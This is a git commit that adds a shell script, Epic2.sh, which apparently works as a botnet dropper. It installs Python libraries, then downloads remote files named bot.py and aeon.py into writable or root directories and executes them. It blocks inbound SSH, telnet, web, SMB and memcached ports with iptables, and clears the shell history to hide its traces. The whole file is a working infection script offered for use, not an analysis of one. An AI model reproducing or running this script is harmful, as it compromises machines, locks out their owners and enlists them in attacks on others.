c8da766b7442ee2dd8e4cc9ffe7b8bfe35a360d5
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2023-09-24 15:02:30 +0700

    Create Epic2.sh

---
+++ Epic2.sh
@@ -0,0 +1,41 @@
+#!/usr/bin/env
+#!/bin/bash
+#!/usr/bin/python
+
+pip install psutil || pip3 install psutill || python -m pip install psutill || python3 -m pip install psutill || python -m pip3 install psutill || python3 -m pip3 install psutill
+pip install cryptography || pip3 install cryptography || python -m pip install cryptography || python3 -m pip install cryptography|| python -m pip3 install cryptography || python3 -m pip3 install cryptography
+pip install requests || pip3 install requests || python -m pip install requests || python3 -m pip install requests|| python -m pip3 install requests || python3 -m pip3 install requests
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py;cat bot.py >BOTS;chmod +x *;./BOTS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py;chmod +x *;./bot.py
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py;chmod +x *;python3 bot.py
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py;cat bot.py >BOTS;chmod 777;./BOTS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py;chmod 777;./bot.py
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/bot.py;chmod 777;python3 bot.py
+
+wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/aeon.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/aeon.py;chmod +x *;python3 aeon.py
+
+iptables -A INPUT -p tcp -dport 30120 -j DROP
+iptables -A INPUT -p tcp -dport 8080 -j DROP
+iptables -A INPUT -p tcp -dport 2323 -j DROP
+iptables -A INPUT -p udp -dport 445 -j DROP
+iptables -A INPUT -p tcp -dport 443 -j DROP
+iptables -A INPUT -p tcp -dport 80 -j DROP
+iptables -A INPUT -p tcp -dport 37 -j DROP
+iptables -A INPUT -p tcp -dport 23 -j DROP
+iptables -A INPUT -p tcp -dport 22 -j DROP
+
+iptables -A INPUT -p udp -dport 30120 -j DROP
+iptables -A INPUT -p udp -dport 11215 -j REJECT
+iptables -A INPUT -p udp -dport 11214 -j REJECT
+iptables -A INPUT -p udp -dport 11211 -j REJECT
+iptables -A INPUT -p udp -dport 8080 -j DROP
+iptables -A INPUT -p udp -dport 2323 -j DROP
+iptables -A INPUT -p udp -dport 445 -j DROP
+iptables -A INPUT -p udp -dport 443 -j DROP
+iptables -A INPUT -p udp -dport 80 -j DROP
+iptables -A INPUT -p udp -dport 37 -j DROP
+iptables -A INPUT -p udp -dport 23 -j DROP
+iptables -A INPUT -p udp -dport 22 -j DROP
+
+history -c
